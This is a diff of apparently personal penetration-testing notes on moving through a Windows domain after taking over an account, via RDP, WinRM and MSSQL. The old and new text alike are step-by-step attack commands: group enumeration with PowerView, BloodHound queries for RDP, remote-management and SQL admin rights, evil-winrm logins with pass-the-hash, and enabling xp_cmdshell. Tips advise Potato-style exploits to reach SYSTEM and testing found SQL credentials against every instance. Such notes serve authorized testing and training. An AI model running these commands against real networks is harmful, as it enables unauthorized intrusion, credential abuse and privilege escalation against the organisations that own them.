@@ -1,94 +1,97 @@
-## Remote Desktop Access
+# Privileged Access — RDP / WinRM / MSSQL
 
-When to use: Foothold established but local admin is missing; checking for jump host placement or access to sensitive data via RDS.
+After taking over an account, check these three before assuming you're stuck without local admin. BloodHound edges: `CanRDP`, `CanPSRemote`, `SQLAdmin`.
 
-Check members of the local Remote Desktop Users group via PowerView
+---
 
-```
-Get-NetLocalGroupMember -ComputerName <TARGET_IP> -GroupName "Remote Desktop Users"
-```
+## RDP
 
-Tool comparison:
+Enumerate who can RDP to a host:
 
-- BloodHound -> Find Workstations/Servers where Domain Users can RDP -> High-speed identification of broad RDP permissions across the domain
-- xfreerdp -> `xfreerdp /u:<USERNAME> /p:<PASSWORD> /v:<TARGET_IP>` -> Primary Linux-based CLI client
-- mstsc.exe -> `mstsc /v:<TARGET_IP>` -> Native Windows client
-
-Gotchas: **Domain Users group** often has broad RDP rights on RDS or jump hosts by design.
-
-## WinRM Enumeration and Shell
-
-When to use: Targeting hosts where specific users or groups have "Remote Management Users" membership or `CanPSRemote` edges in BloodHound.
-
-Enumerate the Remote Management Users group via PowerView
-
-```
-Get-NetLocalGroupMember -ComputerName <TARGET_IP> -GroupName "Remote Management Users"
+```powershell
+Get-NetLocalGroupMember -ComputerName <HOSTNAME> -GroupName "Remote Desktop Users"
 ```
 
-Search BloodHound for all users with WinRM execution rights
+BloodHound queries: **Find Workstations where Domain Users can RDP** / **Find Servers where Domain Users can RDP**. Domain Users having RDP = every account you compromise gets a foothold on that host.
 
-```
-MATCH p1=shortestPath((u1:User)-[r1:MemberOf *1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote* 1..]->(c:Computer) RETURN p2
-```
+Connect from Linux:
 
-Establish a session from a Windows host using valid credentials
-
-```
-$password = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
-$cred = new-object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $password)
-Enter-PSSession -ComputerName <TARGET_IP> -Credential $cred
+```bash
+xfreerdp /u:<USER> /p:<PASS> /d:<DOMAIN> /v:<TARGET_IP>
 ```
 
-Connect from a Linux host using valid credentials
+---
+
+## WinRM
+
+Enumerate Remote Management Users group:
+
+```powershell
+Get-NetLocalGroupMember -ComputerName <HOSTNAME> -GroupName "Remote Management Users"
+```
+
+BloodHound custom Cypher query for WinRM access:
 
 ```
-evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
 ```
 
-Tool comparison:
+Connect from Windows:
 
-- evil-winrm -> `evil-winrm -i <TARGET_IP> -u <USERNAME> -H <HASH>` -> Prefer from Linux; supports Pass-the-Hash and automated script loading
-- Enter-PSSession -> `Enter-PSSession -ComputerName <TARGET_IP> -Credential <CRED>` -> Native Windows method; use when attacking from a Windows pivot
+```powershell
+$pass = ConvertTo-SecureString '<PASS>' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $pass)
+Enter-PSSession -ComputerName <HOSTNAME> -Credential $cred
+```
 
-Gotchas: **Ruby limitations** may break remote path completion in evil-winrm.
+Connect from Linux:
 
-## MSSQL Administrative Access
+```bash
+evil-winrm -i <TARGET_IP> -u <USER> -p <PASS>
+```
 
-When to use: Credentials recovered from config files (web.config) or Kerberoasting; check BloodHound for `SQLAdmin` edges.
+PTH with evil-winrm:
 
-Identify SQL instances within the domain
+```bash
+evil-winrm -i <TARGET_IP> -u <USER> -H <HASH>
+```
+
+---
+
+## MSSQL (SQLAdmin)
+
+BloodHound custom Cypher for SQL admin rights:
 
 ```
+MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
+```
+
+Enumerate instances from Windows:
+
+```powershell
+Import-Module .\PowerUpSQL.ps1
 Get-SQLInstanceDomain
 ```
 
-Execute a version check query against a remote instance via PowerUpSQL
+Run a query to validate access:
 
-```
-Get-SQLQuery -Instance "<TARGET_IP>,<PORT>" -username "<DOMAIN>\<USERNAME>" -password "<PASSWORD>" -query 'Select @@version'
-```
-
-Authenticate to SQL server from Linux using Windows authentication
-
-```
-mssqlclient.py <DOMAIN>/<USERNAME>@<TARGET_IP> -windows-auth
+```powershell
+Get-SQLQuery -Verbose -Instance "<IP>,1433" -username "<DOMAIN>\<USER>" -password "<PASS>" -query 'Select @@version'
 ```
 
-Enable OS command execution after obtaining a SQL shell
+Connect from Linux:
 
-```
-enable_xp_cmdshell
-```
-
-Execute system commands to verify privileges and check for SeImpersonate
-
-```
-xp_cmdshell whoami /priv
+```bash
+mssqlclient.py <DOMAIN>/<USER>@<TARGET_IP> -windows-auth
 ```
 
-Dangerous / misconfigured settings:
+Once in, enable OS command execution:
 
-- **SeImpersonatePrivilege** enabled for the SQL service account allows immediate escalation to SYSTEM via Potato-style exploits
+```
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami /priv
+```
 
-Gotchas: **xp_cmdshell** requires manual activation via `enable_xp_cmdshell` before OS commands function; this configuration change is often logged.
+> [!tip] MSSQL sysadmin → `xp_cmdshell` → check `whoami /priv`. `SeImpersonatePrivilege` enabled is almost guaranteed. JuicyPotato / PrintSpoofer / RoguePotato → SYSTEM. This is near-automatic LPE from any SQL foothold.
+
+> [!tip] SQL creds found in web.config, scripts, or Snaffler output → test against every MSSQL instance in the environment immediately. Don't sit on them.
